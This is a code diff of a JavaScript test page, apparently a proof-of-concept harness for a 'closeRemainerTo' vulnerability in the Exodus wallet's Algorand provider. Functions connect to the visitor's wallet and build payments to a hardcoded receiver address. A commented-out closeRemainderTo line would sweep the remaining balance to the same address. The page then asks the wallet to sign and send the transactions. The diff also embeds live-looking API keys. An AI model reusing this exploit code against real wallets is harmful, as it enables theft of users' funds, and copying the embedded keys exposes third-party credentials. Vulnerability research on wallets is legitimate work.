@@ -43,11 +43,75 @@
                 window.exodus.algorand.connect();
             }
 
+
             // closeRemainerTo vuln
             async function algo_transaction() {
-                const baseServer = "https://algo.a.exodus.io/";
+                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                 const port = "";
-                const token = { 'x-algo-api-token': 'bd5833a117efc9256eee8e3488f2eb430555f690be37805070b259f16fafb052' };
+                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
+                
+                const algodClient = new algosdk.Algodv2(token, baseServer, port);
+        
+                let sender = window.exodus.algorand.address;
+                console.log('[*] sender: ')
+                console.log(sender)
+
+                //Check your balance
+                let accountInfo = await algodClient.accountInformation(sender).do();
+                console.log('[*] accountInfo: ')
+                console.log(accountInfo)
+                console.log("Account balance: %d microAlgos", accountInfo.amount);
+                
+                // Construct the transaction
+                let suggestedParams = await algodClient.getTransactionParams().do();
+                
+                const receiver = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
+                
+                let amount = 100000; // equals 0.1 ALGO
+                
+
+                const enc = new TextEncoder();
+                const note = enc.encode("hsi3");
+
+                //let closeRemainderTo = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
+
+                let txn1 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
+                    suggestedParams,
+                    from: sender,
+                    to: receiver,
+                    amount: amount,
+                    note: note
+                });
+
+                console.log("[*] txn1: ");
+                console.log(txn1);
+
+                const result = await window.exodus.algorand.connect();
+                console.log({result});
+
+                algosdk.assignGroupID([txn1])
+
+                try {
+                    const tmp = await window.exodus.algorand.signAndSendTransaction([
+                        txn1.toByte(),
+                    ]);
+                    console.log({tmp});
+                    const { signedTransactions } = tmp;
+
+                    console.log('[*] Transaction: ');
+                    console.log(signedTransactions);
+                } catch (e) {
+                    console.log('[-] algo_transaction ERROR: ');
+                    console.log(e);
+                }
+            }
+
+
+            // closeRemainerTo vuln
+            async function algo_double_transaction() {
+                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
+                const port = "";
+                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                 
                 const algodClient = new algosdk.Algodv2(token, baseServer, port);
         
@@ -289,7 +353,7 @@
 
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #AF3">
         <h1 style="color:#0Ad;text-shadow: 2px 2px 4px #D34;">
-        72
+        73
         </h1>
         <h2>x0-w</h2>
         
@@ -299,6 +363,7 @@
         <input type="button" value="algo_connect" onclick="algo_connect()" />
         <input type="button" value="accept_connection" onclick="accept_connection()" />
         <input type="button" value="algo_transaction" onclick="algo_transaction()" />
+        <input type="button" value="algo_double_transaction" onclick="algo_double_transaction()" />
         <input type="button" value="asset_transaction" onclick="asset_transaction()" />
         <hr />
         <h3>ETH</h3>
